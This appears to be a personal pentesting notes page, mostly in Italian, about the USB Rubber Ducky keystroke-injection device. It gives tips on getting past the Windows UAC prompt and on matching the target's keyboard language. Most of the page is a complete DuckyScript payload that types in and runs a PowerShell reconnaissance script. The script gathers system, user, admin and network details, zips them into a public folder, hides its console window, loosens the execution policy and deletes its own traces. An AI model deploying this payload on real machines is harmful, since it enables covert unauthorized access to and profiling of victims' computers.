
## Docs
- [Rubber Ducky Official Payload repo](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads)
- [Official Wiki](https://github.com/hak5darren/USB-Rubber-Ducky/wiki)
- [Quick Start Guid](https://blog.hartleybrody.com/rubber-ducky-guide/)
- [Toolkit & Payload generator](https://ducktoolkit.com/)


## Enumeration/Fingerprinting
Cose del target da considerare per creare un payload:


## Tips & Tricks
- Occhio all'**UAC**
	- Sembra sia possibile bypassarla con "ALT + Y" che selezione il tasto Yes. **Ma in italiano il tasto e' "Si"!** quindi usare "ALT + S"
- Selezionare il linguaggio duckyscript legato alla tastiera del target (```DUCKY_LANG it```).

Di conseguenza usare 

- Se   `GUI r`  non funziona in win10 usare il CTRL ESC (Tasto WIN):
	```
	DELAY 2000
	CTRL ESC 
	DELAY 2000 
	STRING notepad.exe 
	ENTER 
	DELAY 2000 
	STRING HELLO WORLD!!! 
	ENTER
	```
 - Quando si fa enumeration/fingerprinting del target attenzione a queste cose:
	- [ ] OS
	- [ ] Layout tastiera
	- [ ] Lingua di sistema (le shortcut cambano in base alla lingua
				(pensa a *ctrl+b* e *ctrl+g* per  il testo **bold** VS **grassetto** o *Y* per "Yes" e *S* per "Si")
	- [ ]  Fa qualcosa di strano quando colleghi una nuova tastiera?
 
 
## Scripts
#### Enumeration Test Script
Funziona su Master-BEEF
```POWERSHELL
DELAY 3850
CTRL ESC 
DELAY 1850 
STRING notepad.exe
ENTER
DELAY 3850
ENTER
DELAY 1850
DOWNARROW
REPEAT 100
ENTER
STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss')
ENTER
STRING $userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime
ENTER
STRING $fileSaveDir = New-Item  ($userDir) -ItemType Directory 
ENTER
STRING $date = get-date 
ENTER
STRING $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
ENTER
STRING $Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' 
ENTER
STRING $Report = $Report + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
ENTER
STRING $SysBootTime = Get-WmiObject Win32_OperatingSystem  
ENTER 
STRING $BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime  
ENTER 
STRING $SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)  
ENTER 
STRING $SerialNo = $SysSerialNo.SerialNumber  
ENTER 
STRING $SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model  
ENTER 
STRING $SysManufacturer = $SysInfo.Manufacturer  
ENTER 
STRING $SysModel = $SysInfo.Model
ENTER 
STRING $OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption 
ENTER 
STRING $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
ENTER
STRING $HD = [math]::truncate($disk.Size / 1GB) 
ENTER
STRING $FreeSpace = [math]::truncate($disk.FreeSpace / 1GB) 
ENTER
STRING $SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize 
ENTER 
STRING $Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB) 
ENTER 
STRING $SysCpu = Get-WmiObject Win32_Processor | Select Name 
ENTER 
STRING $Cpu = $SysCpu.Name 
ENTER  
STRING $HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber 
ENTER 
STRING $HardSerialNo = $HardSerial.SerialNumber 
ENTER  
STRING $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name 
ENTER 
STRING $graphicsCard = gwmi win32_VideoController |select Name 
ENTER
STRING $graphics = $graphicsCard.Name 
ENTER
STRING $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1 
ENTER
STRING $DriveLetter = $CDDrive.Drive 
ENTER 
STRING $DriveName = $CDDrive.Caption 
ENTER
STRING $Disk = $DriveLetter + '\' + $DriveName 
ENTER
STRING $Firewall = New-Object -com HNetCfg.FwMgr  
ENTER 
STRING $FireProfile = $Firewall.LocalPolicy.CurrentProfile  
ENTER
STRING $FireProfile = $FireProfile.FirewallEnabled
ENTER 
STRING $Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"  
ENTER 
STRING  $u = 0 
ENTER 
STRING $allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace) 
ENTER
STRING $Report =  $Report + '<div id=right><h3>USB Devices</h3><table>' 
ENTER 
STRING do { 
ENTER
STRING $gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB) 
ENTER
STRING $Report = $Report + "<tr><td>Drive Name: </td><td> " + $allUsb[$u].Name + $allUsb[$u].Label + "</td><td>Free Space: </td><td>" + $gbUSB + "GB</td></tr>"
ENTER
STRING Write-Output $fullUSB
ENTER 
STRING $u ++ 
ENTER 
STRING } while ($u -lt $allUsb.Count) 
ENTER 
STRING $Report = $Report + '</table></div>' 
ENTER
STRING $UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired  
ENTER 
STRING $UserType = $UserInfo.AccountType 
ENTER
STRING $UserSid = $UserInfo.SID
ENTER  
STRING $UserPass = $UserInfo.PasswordRequired 
ENTER 
STRING $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') 
ENTER 
STRING $Report =  $Report + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>" 
ENTER  
STRING $Report = $Report + '</div>' 
ENTER
STRING $Report =  $Report + '<div id=center><h3>Network Information</h3>' 
ENTER 
STRING $Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html) 
ENTER  
STRING $Report = $Report + '</table></div>' 
ENTER
STRING $Report >> $fileSaveDir'/ComputerInfo.html' 
ENTER
STRING function copy-ToZip($fileSaveDir){ 
ENTER 
STRING $srcdir = $fileSaveDir 
ENTER
STRING $zipFile = 'C:\Users\Public\Report.zip'
ENTER
STRING if(-not (test-path($zipFile))) { 
ENTER
STRING set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
ENTER 
STRING (dir $zipFile).IsReadOnly = $false} 
ENTER
STRING $shellApplication = new-object -com shell.application
ENTER 
STRING $zipPackage = $shellApplication.NameSpace($zipFile) 
ENTER
STRING $files = Get-ChildItem -Path $srcdir 
ENTER 
STRING foreach($file in $files) { 
ENTER
STRING $zipPackage.CopyHere($file.FullName) 
ENTER 
STRING while($zipPackage.Items().Item($file.name) -eq $null){ 
ENTER
STRING Start-sleep -seconds 1 }}} 
ENTER 
STRING copy-ToZip($fileSaveDir) 
ENTER
STRING remove-item $fileSaveDir -recurse 
ENTER
STRING Remove-Item $MyINvocation.InvocationName 
ENTER
CTRL s
DELAY 3850    
STRING C:\Users\Public\config-16414.ps1
ENTER
DELAY 1000
ALT F4 
CTRL ESC 
DELAY 1850 
STRING cmd.exe
ENTER
DELAY 1000
ENTER
DELAY 3850   
STRING mode con:cols=14 lines=1 
ENTER
DELAY 1000
ENTER 
REPEAT 100
ENTER
STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
ENTER 
DELAY 3850  
STRING powershell.exe -File C:\Users\Public\config-16414.ps1
ENTER

```